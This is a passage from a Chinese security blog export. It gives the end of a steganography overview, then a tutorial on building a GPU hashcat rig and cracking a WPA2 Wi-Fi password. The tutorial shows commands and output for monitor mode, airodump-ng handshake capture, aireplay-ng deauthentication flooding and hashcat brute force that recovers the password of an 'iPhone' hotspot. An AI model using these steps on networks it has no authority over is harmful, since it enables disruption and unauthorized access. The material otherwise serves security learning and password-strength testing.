鲁棒性（Robustnes）\n即稳定性（Stability），嵌入载体的信息即使受到一定程度的干扰，也能恢复原来的状态，保持隐藏信息的准确性的能力。即需要保证隐藏信息的稳定性，不能轻易的被干扰、失去。在一般的隐写系统中，鲁棒性往往跟安全性、嵌入容量有非常强的相关性，不能都兼顾，需要根据特定的隐写场景取其最合适的性能。\n\n3. 安全性（Security）\n即保密性（privacy），指载密对象即使受到攻击者恶意分析、攻击仍能保持信息不被感知、提取的能力。通常为了保证隐藏信息的安全性，会使用密码学的加解密算法，利用密钥进行保护以保障隐藏信息的安全能力。如果一个数字隐写系统是绝对安全的，那么这个系统能够抵抗来自攻击者多维、全方向的攻击，并且攻击者拥有无限的计算能力。数字隐写系统的被攻击的过程大致可分为：证明秘密信息的存在、提取秘密信息和破坏秘密信息等三个环节。\n\n4. 隐藏容量和强度（Hide capacity and strength）\n即表征载体对象能够隐藏信息的容量大小。在保证不可感知性和安全性的前提下，隐藏容量越大越好。隐藏容量可以从空域、频域等多个维度来考虑，每种维度的容量有所差别。通常需要在隐藏容量、不可感知性、鲁棒性、安全性当中做取舍。因为嵌入的信息越多，在一定条件下安全性和鲁棒性就越脆弱。\n\n5. 嵌入效率（Embedding efficiency）\n即嵌入信息的比特数与嵌入信息后所修改的载体的比特数之比。在嵌入相同的隐藏信息比特条件下，嵌入效率也高，改变的相对比特数越少，嵌入算法安全性越高。目前有多种算法可以提高嵌入效率，如：栅格码[4]、湿纸码[5]、快速BCH码[6]等。\n\n  正如上面指标中所指出的，每种性能都有其特性，提高一种性能的指标，势必会对其他几个性能指标有所影响，所以需要全面、综合考虑这几个性能之间的联系，需要考虑应用的用途、对象等条件综合选择这几个性能。J.Fridrich在[7]中提出不可感知性、隐藏容量、鲁棒性三者之间的三角联系，如图所示：\n\n<div style=\"text-align: center;\">\n\n![不可感知性、鲁棒性、安全性关系“铁三角”](8343187-75d710034ada886f.png)</div>\n\n> [1] Artz D. Digital steganography: hiding data within data[J]. Internet Computing IEEE, 2001, 5(3):75-80.\n[2] 刘培培. 图像脆弱数字水印和数字隐写的几个关键技术研究[D]. 西南交通大学, 2008.\n[3] 陈波, 谭运猛, 吴世忠. 信息隐藏技术综述[J]. 计算机与数字工程, 2005, 33(2):21-23.\n[4] T Filler ，J Judas ，J Fridrich. Minimizing Additive Distortion in Steganography Using Syndrome-Trellis Codes. IEEE Signal Processing Society, 2011.\n[5] Fridrich J, Goljan, Soukal D. Wet paper codes with improved embedding efficiency[J]. IEEE Transactions on Information Forensics and Security, 2006, 1(1):102-110.\n[6] Zhang R, Sachnev V, Kim H J. Fast BCH Syndrome Coding for Steganography[J].  2009.\n[7] Fridrich J . Applications of data hiding in digital images[C] International Symposium on Signal Processing & Its Applications. IEEE, 1998.\n","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"http://www.killshadow.xyz/tags/MISC/"}]},{"title":"Ubuntu18.04+8x1080ti爆破环境从零搭建","date":"2018-10-24T12:20:38.498Z","path":"2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/","raw":"---\ntitle: Ubuntu18.04+8x1080ti爆破环境从零搭建\ndate: \ncategories:\ntoc: ture\ntags:\n\t- Wireless\ncomments: true\n---\n\n>\n> 硬件环境:\n>\n> 主机: TYAN FT77D-B7109\n>\n> CPU: Intel Xeon Scalable Processor\n>\n> GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉)\n>\n> 内存: 32G\n>\n> 硬盘: 1T SSD\n\n<!-- more -->\n\n## 0x00 配置环境\n\n### 0x01 安装系统\n\n> 目标系统: [Ubuntu 18.04.1 LTS Desktop](https://www.ubuntu.com/download/desktop) (建议安装Server版)\n\n在官网下载好启动盘之后, 用烧录工具(建议用[win32diskimager](https://sourceforge.net/projects/win32diskimager/))写入U盘, 然后进入启动项选为U盘启动, 接下来开始安装, 一路默认配置就好. 具体步骤请谷歌, 这里就不赘述了. (这里我们遇到一个坑, 就是插了PCIE网卡之后安装系统一直重启, 可能是主机的兼容性问题, 装系统的时候如果条件允许, 最好把所有的外置设备卸载掉)\n\n\n\n### 0x02 安装GPU驱动\n\n1. 安装好系统之后, 可以配置一下更新源(`/etc/apt/sources.list`,我用的是中科大源), update一下系统. \n\n   ```\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse\n   deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse\n   deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse\n   ```\n\n   ```bash\n   sudo apt-get update && apt-get upgrade\n   sudo apt-get install gcc make p7zip-full git lsb-core\n   ```\n\n2. 然后将Nouveau(NVIDIA通用显卡驱动)禁用:\n\n   ```bash\n   sudo bash -c \"echo blacklist nouveau > /etc/modprobe.d/blacklist-nvidia-nouveau.conf\"\n   sudo bash -c \"echo options nouveau modeset=0 >> /etc/modprobe.d/blacklist-nvidia-nouveau.conf\"\n   sudo update-initramfs -u\n   sudo reboot\n   ```\n\n3. 等重启之后, 再添加32位的NVIDIA驱动源:\n\n   ```bash\n   sudo dpkg --add-architecture i386\n   sudo apt-get update\n   sudo apt-get install build-essential libc6:i386\n   ```\n\n4. 在官网下载[驱动](http://www.nvidia.com/Download/index.aspx), 下载好之后:\n\n   ```bash\n   chmod +x NVIDIA*.run\n   sudo ./NVIDIA*.run\n   sudo reboot\n   ```\n\n   或者:\n\n   ```bash\n   wget http://us.download.nvidia.com/XFree86/Linux-x86_64/375.26/NVIDIA-Linux-x86_64-375.26.run\n   chmod +x NVIDIA-Linux-x86_64-375.26.run\n   sudo ./NVIDIA-Linux-x86_64-375.26.run\n   ```\n\n5. (可选步骤)安装CPU集成显卡驱动:\n\n   ```bash\n   wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz\n   tar -xvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz\n   cd opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25\n   ./install.sh \n   ```\n\n6. 这时候可以看一下显卡配置:\n\n   ```\n   lspci | grep VGA\n   ```\n\n\n\n### 0x03 安装hashcat\n\n```bash\nwget https://hashcat.net/files/hashcat-3.30.7z\n7z x hashcat-3.30.7z\ncd hashcat-3.30\n```\n\n这是个比较老的版本, 我用的aircrack跑出来的包用这个版本可以跑. 如果想尝一下鲜也可以:\n\n```bash\nwget https://hashcat.net/files/hashcat-4.2.1.7z\n```\n\n顺便测试一下速度(在解压后的目录里直接运行`./example0.sh`即可):\n\n```bash\nSession..........: hashcat\nStatus...........: Bypass\nHash.Type........: MD5\nHash.Target......: example0.hash\nTime.Started.....: Sat Oct 20 20:08:33 2018 (27 mins, 0 secs)\nTime.Estimated...: Sat Oct 20 22:31:24 2018 (1 hour, 55 mins)\nGuess.Base.......: File (example.dict), Right Side\nGuess.Mod........: Mask (?a?a?a?a?a?a) [6], Left Side\nGuess.Queue.Base.: 1/1 (100.00%)\nGuess.Queue.Mod..: 1/1 (100.00%)\nSpeed.Dev.#2.....:  8340.3 MH/s (6.61ms) @ Accel:128 Loops:64 Thr:256 Vec:1\nSpeed.Dev.#3.....:  7938.7 MH/s (6.93ms) @ Accel:128 Loops:64 Thr:256 Vec:1\nSpeed.Dev.#*.....: 16279.0 MH/s\nRecovered........: 3035/6494 (46.74%) Digests, 0/1 (0.00%) Salts\nRecovered/Time...: CUR:25,N/A,N/A AVG:29,1773,42558 (Min,Hour,Day)\nProgress.........: 26411945426944/139573552218112 (18.92%)\nRejected.........: 0/26411945426944 (0.00%)\nRestore.Point....: 200933376/1073741824 (18.71%)\nCandidates.#2....: sarusix102x -> 6o9momx49wy3c2\nCandidates.#3....: sarseeethelia3 -> 6o9602eugeni\nHWMon.Dev.#2.....: Temp: 79c Fan: 62% Util: 94% Core:1860MHz Mem:5005MHz Bus:16\nHWMon.Dev.#3.....: Temp: 84c Fan: 78% Util: 94% Core:1771MHz Mem:5005MHz Bus:16\n\nStarted: Sat Oct 20 20:08:26 2018\nStopped: Sat Oct 20 20:35:35 2018\n```\n\n- 关于上面输出的参数解析:\n\n\n  ```bash\n  实际上example0.sh的命令如下:\n  ./hashcat64.bin -t 32 -a 7 example0.hash ?a?a?a?a example.dict\n  \n  Session..........:\n  Status...........: \n  Hash.Type........: 表示哈希计算的类型\n  Hash.Target......: 表示目标哈希表\n  Time.Started.....: 计算开始时间\n  Time.Estimated...: 估计结束时间\n  Guess.Base.......: 密码字典\n  Guess.Mod........: 密码类型(大小写/数字等)\n  Guess.Queue.Base.:\n  Guess.Queue.Mod..:\n  Speed.Dev.#2.....: 显卡1的速度(8340.0MH/s 约等于每秒83亿次运算)\n  Speed.Dev.#3.....: 显卡2...\n  Speed.Dev.#*.....: 总速度\n  Recovered........: \n  Recovered/Time...: 当前已用时间(分,时,天); 平均需要时间(分,时,天)\n  Progress.........: 当前进度\n  Rejected.........: 应该是丢包率(猜的)\n  Restore.Point....: 当前的进度\n  Candidates.#2....: 即将尝试爆破的密码(猜的)\n  Candidates.#3....: \n  HWMon.Dev.#2.....: Temp表示当前显卡温度;Fan表示风扇转速;Men内存频率\n  HWMon.Dev.#3.....: Util表示内存使用率;Core表示GPU核频率;Bus通道数\n  ```\n\n- 关于hashcat命令参数解析(详见[附录一](#附录一)):\n\n  ```\n  -a  指定要使用的破解模式\n  -m  指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法\n  -o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中\n  --force\t忽略破解过程中的警告信息,跑单条hash可能需要加上此选项\n  --show\t显示已经破解的hash及该hash所对应的明文\n  --increment\t 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长\n  --increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用\n  --increment-max  密码最大长度,同上\n  --outfile-format 指定破解结果的输出格式id,一般自己常用3\n  --username \t 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到\n  --remove \t 删除已被破解成功的hash\n  -r\t\t 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的\n  ```\n\n- 真实爆破WiFi密码情况系hashcat参数解析:\n\n  ```bash\n  ./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?l?l?l?l?l?l?l?l\n  ```\n\n  > -m : hash的类型, 2500代表的是WPA/WPA2协议. 详见[② Hash种类](② Hash种类)\n  >\n  > -a: 有多种参数, 3表示穷举. 详见[⑤ 攻击模式](#⑤ 攻击模式)\n  >\n  > *.hccap: 即为`aircrack`抓到的包之后转化而来的\n  >\n  > ?l: 表示所有的小写字母. 详见[⑥ 内置字符集](⑥ 内置字符集)\n\n\n\n## 0x10 Crack实战\n\n### 0x11 初始配置\n\n1. 首先需要找一个可以监听注入的USB网卡, 如果笔记本自带网卡能用就更好了. 这里以`rt2800usb`为例讲解:\n\n   ```bash\n   root@ks:/home/ks# airmon-ng \n   PHY\tInterface\tDriver\t\tChipset\n   phy0\twlp3s0\t\tiwlwifi\t\tIntel Corporation Device 24fb (rev 10)\n   phy1\twlx7cdd90f1f416\trt2800usb\tRalink Technology, Corp. RT2870/RT3070\n   ```\n\n   可以看到, 有两张网卡, `wlp3s0`是笔记本自带的英特尔系列网卡; `lx7cdd90f1f416`是能够监听的新插入的usb网卡.\n\n2. 查看网卡状态, 两张网卡的Mode都是`Managed`:\n\n   ```bash\n   root@ks:/home/ks# iwconfig\n   wlx7cdd90f1f416  IEEE 802.11  ESSID:off/any  \n   Mode:Managed  Access Point: Not-Associated   Tx-Power=off   \n   Retry short  long limit:2   RTS thr:off   Fragment thr:off\n   Encryption key:off\n   Power Management:off\n   lo        no wireless extensions.\n   wlp3s0    IEEE 802.11  ESSID:off/any  \n   Mode:Managed  Access Point: Not-Associated   Tx-Power=off   \n   Retry short limit:7   RTS thr:off   Fragment thr:off\n   Encryption key:off\n   Power Management:on\n   enp2s0    no wireless extensions.\n   enp0s20f0u1  no wireless extensions.\n   ```\n\n3. 为了避免冲突, 先杀占用进程\n\n   ```bash\n   root@ks:/home/ks# airmon-ng check kill\n   \n   Killing these processes:\n   \n     PID Name\n     891 wpa_supplicant\n    3091 dhclient\n    4430 avahi-daemon\n    4431 avahi-daemon\n   ```\n\n4. 然后将能够抓包的网卡的Mode设为`Monitor`\n\n   ```bash\n   root@ks:/home/ks# airmon-ng start wlx7cdd90f1f416\n   \n   Found 2 processes that could cause trouble.\n   If airodump-ng, aireplay-ng or airtun-ng stops working after\n   a short period of time, you may want to run 'airmon-ng check kill'\n   \n     PID Name\n    7674 avahi-daemon\n    7675 avahi-daemon\n   \n   PHY\tInterface\tDriver\t\tChipset\n   \n   phy0\twlp3s0\t\tiwlwifi\t\tIntel Corporation Device 24fb (rev 10)\n   phy4\twlx7cdd90f1f416\trt2800usb\tRalink Technology, Corp. RT2870/RT3070\n   \twlx7cdd90f1f416 is soft blocked, please run \"rfkill unblock wlx7cdd90f1f416\" to use this interface.\n   rfkill error, unable to start wlx7cdd90f1f416\n   \n   Would you like to try and automatically resolve this? [y/n] y\n   rfkill error: rfkill: invalid identifier: 4\n   Unable to unblock.\n   Interface 15mon is too long for linux so it will be renamed to the old style (wlan#) name.\n   \n   \t\t(mac80211 monitor mode vif enabled on [phy4]wlan0mon\n   \t\t(mac80211 station mode vif disabled for [phy4]wlx7cdd90f1f416)\n   ```\n\n5. 此时再看一下无线网卡状态:\n\n   ```bash\n   root@ks:/home/ks# iwconfig\n   lo        no wireless extensions.\n   \n   wlp3s0    IEEE 802.11  ESSID:off/any  \n             Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   \n             Retry short limit:7   RTS thr:off   Fragment thr:off\n             Encryption key:off\n             Power Management:on\n             \n   wlan0mon  IEEE 802.11  Mode:Monitor  Tx-Power=off   \n             Retry short  long limit:2   RTS thr:off   Fragment thr:off\n             Power Management:off\n             \n   enp2s0    no wireless extensions.\n   \n   enp0s20f0u1  no wireless extensions.\n   ```\n\n   已更改~\n\n### 0x12 实施攻击\n\n1. 我们的攻击目标是`iPhone`:\n\n   ```bash\n   root@ks:/home/ks# airodump-ng wlan0mon\n   ```\n\n   ![img](1540284494095.png)\n\n   上图可看到它的mac是` 74:D2:1D:AE:3F:94 `, 信道(CH)是`1`. (记住这两个信息下面有用)\n\n2. 接下来我们开两个shell, 一个shell负责监听握手包, 另一个shell负责洪荒攻击两个正常连接的WiFi设备, 我们先看看第一个shell:\n\n   ```bash\n   airodump-ng --bssid 74:D2:1D:AE:3F:94 -c 1 -w test wlan0mon\n   ```\n\n   ![img](1540286260611.png)\n\n   可以看出来已经抓到了握手包703个. 对命令参数解释如下:\n\n   > --bssid: 表示WiFi热点的mac\n   >\n   > -c: 表示信道1\n   >\n   > -w: 后面跟着文件名\n   >\n   > wlan0mon: 需要监听的网卡\n\n3. 开启了监听之后, 我们就需要DDoS目标连接了, 这时候在另一个shell输入如下命令:\n\n   ```bash\n   aireplay-ng --deauth 5 -a 74:D2:1D:AE:3F:94 wlan0mon\n   ```\n\n   隔几秒发一次, 以抓到足够的握手包, 减少爆破的时间.\n\n## 0x20 开始爆破\n\n在上面操作的监听过程中, 会在当前路径下保存一个抓到的握手包的数据, 但这个流量包还不能直接让hashcat跑, 需要做简单的处理, 先做一个简单的数据清洗:\n\n```bash\nroot@ks:~/crack_packet_wifi# wpaclean wpapass.cap test-05.cap \nPwning test-05.cap (1/1 100%)\nNet 74:d2:1d:ae:3f:94 iPhone\nDone\n```\n\n可以看到, 已经成功识别出目标无限的mac. 接下来我们吧数据包转换成hashcat能够识别的hash类型:\n\n```bash\nroot@ks:/home/ks/software/crack_pw/crack_packet_wifi# aircrack-ng wpapass.cap -J wpahash\nOpening wpapass.cap\nRead 3 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  74:D2:1D:AE:3F:94  iPhone                    WPA (1 handshake)\n\nChoosing first network as target.\nOpening wpapass.cap\nReading packets, please wait...\nBuilding Hashcat (1.00) file...\n[*] ESSID (length: 6): iPhone\n[*] Key version: 2\n[*] BSSID: 74:D2:1D:AE:3F:94\n[*] STA: 88:C9:D0:B7:2C:36\n[*] anonce:\n    E6 A3 D9 3C 95 77 3E 0B 5D 84 CE 65 0D 1C EB 59 \n    E4 E4 E3 A5 3A 07 FE D8 47 A1 7C 77 10 66 DC E4 \n[*] snonce:\n    03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 2A \n    4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 AD \n[*] Key MIC:\n    21 51 2B 3C 6F 37 CA 9E 09 6C 92 74 45 DC DA 11\n[*] eapol:\n    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 \n    03 03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 \n    2A 4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 \n    AD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC \n    04 01 00 00 0F AC 02 80 00 \nSuccessfully written to wpahash.hccap\nQuitting aircrack-ng...\n```\n\n接下来就是直接放到爆破的服务器上跑(实测用最新版的hashcat跑不了, 这里用了3.30版本的hashcat)\n\n```bash\n./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?d?d?d?d?d?d?d?d\n```\n\n几秒钟就跑出来了:\n\n```bash\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: WPA/WPA2\nHash.Target......: iPhone (74:d2:1d:ae:3f:94 <-> 88:c9:d0:b7:2c:36)\nTime.Started.....: Tue Oct 23 17:43:18 2018 (3 secs)\nTime.Estimated...: Tue Oct 23 17:44:52 2018 (1 min, 31 secs)\nInput.Mask.......: ?d?d?d?d?d?d?d?d [8]\nInput.Queue......: 1/1 (100.00%)\nSpeed.Dev.#2.....:   535.2 kH/s (6.23ms)\nSpeed.Dev.#3.....:   527.7 kH/s (6.34ms)\nSpeed.Dev.#*.....:  1062.9 kH/s\nRecovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts\nProgress.........: 2207744/100000000 (2.21%)\nRejected.........: 0/2207744 (0.00%)\nRestore.Point....: 0/10000000 (0.00%)\nCandidates.#2....: 42345678 -> 41875555\nCandidates.#3....: 40689823 -> 49471088\nHWMon.Dev.#2.....: Temp: 41c Fan: 29% Util: 97% Core:1860Mhz Mem:5005Mhz Lanes:16\nHWMon.Dev.#3.....: Temp: 41c Fan:  0% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16\n\niPhone:74d21dae3f94:88c9d0b72c36:67854312                 \n```\n\n假设我们把它设置成全字符爆破, 也就是:\n\n```bash\n./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?a?a?a?a?a?a?a?a\n```\n\n则需要几百年(可见, 如果知道WiFi密码的字符组成结构, 也就成功了一半了):\n\n```bash\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: WPA/WPA2\nHash.Target......: iPhone (74:d2:1d:ae:3f:94 <-> 88:c9:d0:b7:2c:36)\nTime.Started.....: Tue Oct 23 17:53:33 2018 (31 secs)\nTime.Estimated...: Fri Dec 24 03:40:44 2021 (200 years, 198 days)\nInput.Mask.......: ?a?a?a?a?a?a?a?a [8]\nInput.Queue......: 1/1 (100.00%)\nSpeed.Dev.#2.....:   531.0 kH/s (6.38ms)\nSpeed.Dev.#3.....:   517.3 kH/s (6.52ms)\nSpeed.Dev.#*.....:  1048.3 kH/s\nRecovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts\nProgress.........: 31854592/6634204312890625 (0.00%)\nRejected.........: 0/31854592 (0.00%)\nRestore.Point....: 0/69833729609375 (0.00%)\nCandidates.#2....: E]_LINAN -> E;$.1988\nCandidates.#3....: Narinane -> N\"XZANAN\nHWMon.Dev.#2.....: Temp: 66c Fan: 47% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16\nHWMon.Dev.#3.....: Temp: 65c Fan: 34% Util: 97% Core:1759Mhz Mem:5005Mhz Lanes:16\n```\n\n\n\n## 参考链接\n\n1. [How to build a 8 GPU password cracker](https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker)\n2. [Running HashCat on Ubuntu 18.04 Server with 1080TI](https://www.blackhillsinfosec.com/running-hashcat-on-ubuntu-18-04-server-with-1080ti/)\n3. [How to Build a Password Cracker with NVidia GTX 1080TI & GTX 1070](https://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/)\n4. [快速破解各种散列hash hashcat入门篇 ](https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/)\n5. [aircrack & hashcat 非字典高速破解目标无线密码](https://klionsec.github.io/2015/04/14/aircrack-hascat/)\n6. [用hashcat超速破解WiFi密码](https://bbs.ichunqiu.com/thread-21342-1-1.html)\n7. [开源GPU密码破解工具–HashCat](http://www.arkteam.net/?p=3737)\n8. [hashcat 帮助文件 中文翻译](https://www.jianshu.com/p/156e47e71b67)\n9. [Hashcat用户手册——直接攻击模式的使用](http://www.freebuf.com/column/175400.html)\n\n## 附录一\n\n### ① hashcat选项解释\n\n用法: \n\n```bash\nhashcat [选项]... hash|hash文件|hccapx文件 [字典|掩码|目录]...\n```\n\n| 选项 缩写 / 原文          | 参数类型 | 描述                                      | 用例                           |\n| ------------------------- | -------- | ----------------------------------------- | ------------------------------ |\n| -m,--hash-type            | 数字     | Hash种类，参见下面的参考                  | -m 1000                        |\n| -a,--attack-mode          | 数字     | 攻击模式，参见下面的参考                  | -a 3                           |\n| -V,--version              |          | 输出版本信息                              |                                |\n| -h,--help                 |          | 输出帮助信息                              |                                |\n| --quiet                   |          | 禁用输出                                  |                                |\n| --hex-charset             |          | 字符集以十六进制形式给出                  |                                |\n| --hex-salt                |          | 盐以十六进制形式给出                      |                                |\n| --hex-wordlist            |          | 字典中的单词是以十六进制形式给出的        |                                |\n| --force                   |          | 忽略警告                                  |                                |\n| --status                  |          | 自动更新屏幕                              |                                |\n| --status-timer            | 数字     | 设置自动更新屏幕间隔为X秒                 | --status-timer=1               |\n| --machine-readable        |          | 以机器可读格式显示状态视图                |                                |\n| --keep-guessing           |          | 被破解之后继续猜测Hash                    |                                |\n| --loopback                |          | 在induction目录中加入新的纯文本文件       |                                |\n| --weak-hash-threshold     | 数字     | 当阈值为X时停止检查弱Hash                 | --weak=0                       |\n| --markov-hcstat           | 文件     | 指定要使用的hcstat文件                    | --markov-hc=my.hcstat          |\n| --markov-disable          |          | 禁用马尔可夫链，模仿经典暴力破解          |                                |\n| --markov-classic          |          | 启用经典马尔可夫链，无任何位置            |                                |\n| -t,--markov-threshold     | 数字     | 当阈值X时停止接收新的马尔科夫链           | -t 50                          |\n| --runtime                 | 数字     | 运行X秒后中止会话                         | --runtime=10                   |\n| --session                 | 字符串   | 定义具体的会话名称                        | --session=mysession            |\n| --restore                 |          | 从--session恢复会话                       |                                |\n| --restore-disable         |          | 不写入恢复文件                            |                                |\n| --restore-file-path       | 文件     | 指定恢复文件的路径                        | --restore-file-path=my.restore |\n| -o,--outfile              | 文件     | 定义恢复的Hash的输出文件                  | -o outfile.txt                 |\n| --outfile-format          | 数字     | 定义恢复的Hash的输出格式，参见下面的参考  | --outfile-format=7             |\n| --outfile-autohex-disable |          | 在输出纯文本文件中禁用$HEX[]              |                                |\n| --outfile-check-timer     | 数字     | 设置输出文件检查间隔为X秒                 | --outfile-check=30             |\n| -p,--separator            | 字符     | Hash表和输出文件的分隔符                  | -p :                           |\n| --stdout                  |          | 不破解Hash，只打印候选值                  |                                |\n| --show                    |          | 比较Hash表和pot文件，显示已破解的Hash     |                                |\n| --left                    |          | 比较Hash表和pot文件，显示未破解的Hash     |                                |\n| --username                |          | 忽略Hash文件中的用户名                    |                                |\n| --remove                  |          | 一旦破解，就删除Hash                      |                                |\n| --remove-timer            | 数字     | 每X秒更新输入的Hash文件                   | --remove-timer=30              |\n| --potfile-disable         |          | 不写入pot文件                             |                                |\n| --potfile-path            | 目录     | 指定pot文件的路径                         | --potfile-path=my.pot          |\n| --debug-mode              | 数字     | 定义调试模式(仅通过使用规则进行混合)      | --debug-mode=4                 |\n| --debug-file              | 文件     | 调试规则的输出文件                        | --debug-file=good.log          |\n| --induction-dir           | 目录     | 指定loopback的induction目录               | --induction=inducts            |\n| --outfile-check-dir       | 目录     | 指定监控纯文本文件的输出目录              | --outfile-check-dir=x          |\n| --logfile-disable         |          | 禁用日志文件                              |                                |\n| --hccapx-message-pair     | 数字     | 只从hccapx加载匹配X的消息对               | --hccapx-message-pair=2        |\n| --nonce-error-corrections | 数字     | 用BF大小范围来取代AP最后字节的随机数      | --nonce-error-corrections=16   |\n| --truecrypt-keyfiles      | 文件     | 要使用的密匙文件，用逗号分隔              | --truecrypt-key=x.png          |\n| --veracrypt-keyfiles      | 文件     | 要使用的密匙文件，用逗号分隔              | --veracrypt-key=x.txt          |\n| --veracrypt-pim           | 数字     | VeraCrypt的头部密钥生成的迭代次数(PIM)    | --veracrypt-pim=1000           |\n| -b,--benchmark            |          | 运行基准测试                              |                                |\n| --speed-only              |          | 返回预期的攻击速度，然后退出              |                                |\n| --progress-only           |          | 返回理想进度的步骤大小和处理时间          |                                |\n| -c,--segment-size         | 数字     | 为wordfile设置 X MB缓存                   | -c 32                          |\n| --bitmap-min              | 数字     | 设置位图最小为X位(bit)                    | --bitmap-min=24                |\n| --bitmap-max              | 数字     | 设置位图最大为X位(bit)                    | --bitmap-max=24                |\n| --cpu-affinity            | 字符串   | 设置CPU相关性，用逗号分隔                 | --cpu-affinity=1,2,3           |\n| -I,--opencl-info          |          | 显示检测到的OpenCL平台/设备的信息         | -I                             |\n| --opencl-platforms        | 字符串   | 要使用的OpenCL平台，用逗号分隔            | --opencl-platforms=2           |\n| -d,--opencl-devices       | 字符串   | 要使用的OpenCL设备，用逗号分隔            | -d 1                           |\n| -D,--opencl-device-types  | 字符串   | 要使用的OpenCL设备类型，用逗号分隔        | -D 1                           |\n| --opencl-vector-width     | 数字     | 手动覆盖OpenCL矢量宽度为X                 | --opencl-vector=4              |\n| -w,--workload-profile     | 数字     | 设置工作负载配置文件，参见下面的参考      | -w 3                           |\n| -n,--kernel-accel         | 数字     | 手动调整工作负载，将外圈步长设置为X       | -n 64                          |\n| -u,--kernel-loops         | 数字     | 手动调整工作负载，将内圈步长设置为X       | -u 256                         |\n| --nvidia-spin-damp        | 数字     | 可变通NVIDIA处理器热循环Bug，用百分比表示 | --nvidia-spin-damp=50          |\n| --gpu-temp-disable        |          | 禁用GPU温度和风扇速度的读取和触发         |                                |\n| --gpu-temp-abort          | 数字     | 如果GPU温度达到X摄氏度，则中止            | --gpu-temp-abort=100           |\n| --gpu-temp-retain         | 数字     | 尝试将GPU温度保持在X摄氏度                | --gpu-temp-retain=95           |\n| --powertune-enable        |          | 启用电源调整。 完成后恢复设置             |                                |\n| --scrypt-tmto             | 数字     | 手动覆盖scrypt的TMTO值为X                 | --scrypt-tmto=3                |\n| -s,--skip                 | 数字     | 跳过前X个单词                             | -s 1000000                     |\n| -l,--limit                | 数字     | 跳过单词后限制X个单词                     | -l 1000000                     |\n| --keyspace                |          | 显示密钥空间base：mod值后退出             |                                |\n| -j,--rule-left            | 规则     | 单个规则应用于字典中左侧的每个单词        | -j 'c'                         |\n| -k,--rule-right           | 规则     | 单个规则应用于字典中右侧的每个单词        | -k '^-'                        |\n| -r,--rules-file           | 文件     | 多个规则应用于字典中的每个单词            | -r rules/best64.rule           |\n| -g,--generate-rules       | 数字     | 生成X个随机规则                           | -g 10000                       |\n| --generate-rules-func-min | 数字     | 强制每个规则最小X个函数                   |                                |\n| --generate-rules-func-max | 数字     | 强制每个规则最大X个函数                   |                                |\n| --generate-rules-seed     | 数字     | 强制RNG种子设置为X                        |                                |\n| -1,--custom-charset1      | 字符集   | 用户定义的字符集 ?1                       | -1 ?l?d?u                      |\n| -2,--custom-charset2      | 字符集   | 用户定义的字符集 ?2                       | -2 ?l?d?s                      |\n| -3,--custom-charset3      | 字符集   | 用户定义的字符集 ?3                       |                                |\n| -4,--custom-charset4      | 字符集   | 用户定义的字符集 ?4                       |                                |\n| -i,--increment            |          | 启用掩码增量模式                          |                                |\n| --increment-min           | 数字     | 在X处开始掩码递增                         | --increment-min=4              |\n| --increment-max           | 数字     | 在X处停止掩码递增                         | --increment-max=8              |\n\n### ② Hash种类\n\n| 编号  | 名称                                             | 类别                                    |\n| ----- | ------------------------------------------------ | --------------------------------------- |\n| 900   | MD4                                              | 纯Hash                                  |\n| 0     | MD5                                              | 纯Hash                                  |\n| 5100  | Half MD5                                         | 纯Hash                                  |\n| 100   | SHA1                                             | 纯Hash                                  |\n| 1300  | 